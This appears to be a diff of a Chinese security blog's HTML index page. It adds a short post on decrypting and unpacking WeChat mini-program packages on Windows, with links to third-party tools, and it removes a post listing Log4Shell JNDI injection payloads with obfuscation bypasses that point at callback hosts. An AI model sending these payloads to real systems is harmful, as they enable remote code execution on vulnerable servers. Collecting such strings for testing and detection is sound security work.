@@ -163,6 +163,78 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.njcit.me/2023/01/06/Windows%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ccadmin">
+      <meta itemprop="description" content="web安全">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="这里有一个网站">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/01/06/Windows%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/" class="post-title-link" itemprop="url">Windows小程序反编译</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-01-06 15:13:19 / 修改时间：17:30:06" itemprop="dateCreated datePublished" datetime="2023-01-06T15:13:19+08:00">2023-01-06</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Windows小程序是加密存储，没办法直接反编译（解包），需要先解密，然后再反编译，这篇文章主要介绍如何在Windows上不依赖手机和root来获取小程序的源码。</p>
+<h1 id="所需工具"><a href="#所需工具" class="headerlink" title="所需工具"></a>所需工具</h1><ul>
+<li>PC微信小程序包解密工具:<a target="_blank" rel="noopener" href="https://share.weiyun.com/uMqNGOXv">https://share.weiyun.com/uMqNGOXv</a></li>
+<li>反编译（解包）工具:<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1dg5SdCv_VgzYVeakALgyVg?pwd=rd4h">https://pan.baidu.com/s/1dg5SdCv_VgzYVeakALgyVg?pwd&#x3D;rd4h</a>（丢，收费了）</li>
+<li>工具包：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Az--jmLIuN2YOkK03AsBCw?pwd=1111">https://pan.baidu.com/s/1Az--jmLIuN2YOkK03AsBCw?pwd=1111</a></li>
+</ul>
+<h1 id="过程记录"><a href="#过程记录" class="headerlink" title="过程记录"></a>过程记录</h1><p>首先获取小程序包，如果你没修改过微信文件的存储位置，那么默认在C:\Users\用户\Documents\WeChat Files\Applet中。里面会有一堆wx开头的文件夹，有两周方法确认哪个是你要找的小程序所在的文件夹：一是根据时间来判断，二是把所有文件夹都删除，重新打开小程序生成的文件夹就是。  </p>
+<p>我这里的文件路径是D:\Users\admin\Documents\WeChat Files\Applet\wxa9d6ad7b7a62a74a\862</p>
+<p><img src="/../images/Windows%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/image-20230106153452966.png" alt="image-20230106153452966"></p>
+<p>使用第一个工具解密，不要把文件复制出来</p>
+<p><img src="/../images/Windows%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/image-20230106153628836.png" alt="image-20230106153628836"></p>
+<p>解密成功的文件</p>
+<p><img src="/../images/Windows%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/image-20230106153830918.png" alt="image-20230106153830918"></p>
+<p>未完待续</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://blog.njcit.me/2023/01/06/Linux%E7%A1%AC%E7%9B%98%E8%B8%A9%E5%9D%91%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -836,68 +908,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://blog.njcit.me/2022/12/16/log4j-payload/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="ccadmin">
-      <meta itemprop="description" content="web安全">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="这里有一个网站">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/12/16/log4j-payload/" class="post-title-link" itemprop="url">log4j_payload</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-12-16 15:07:51 / 修改时间：15:09:50" itemprop="dateCreated datePublished" datetime="2022-12-16T15:07:51+08:00">2022-12-16</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="常用log4j-payload-以及绕过"><a href="#常用log4j-payload-以及绕过" class="headerlink" title="常用log4j payload 以及绕过"></a>常用log4j payload 以及绕过</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://xxx.dnslog.cn&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://asdasd.asdasd.asdasd/poc&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi://asdasd.asdasd.asdasd/ass&#125;</span><br><span class="line">$&#123;jndi:rmi://adsasd.asdasd.asdasd&#125;</span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://adsasd.asdasd.asdasd/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://adsasd.asdasd.asdasd/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://adsasd.asdasd.asdasd/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://xxx xxxx.xx/poc&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://127.0.0.1:1389/ass&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi://127.0.0.1:1389/ass&#125;</span><br><span class="line">$&#123;jndi:rmi://a.b.c&#125;</span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://q.w.e/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://a.s.d/poc&#125;</span><br><span class="line">abcd-$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://asdasd.asdasd.asdasd/poc&#125;-aksdkashkd--</span><br></pre></td></tr></table></figure>
-
-<p>来源：  </p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/VmUh49pHcEumJIKsulW3gw">https://mp.weixin.qq.com/s/VmUh49pHcEumJIKsulW3gw</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -967,14 +977,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-count">15</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
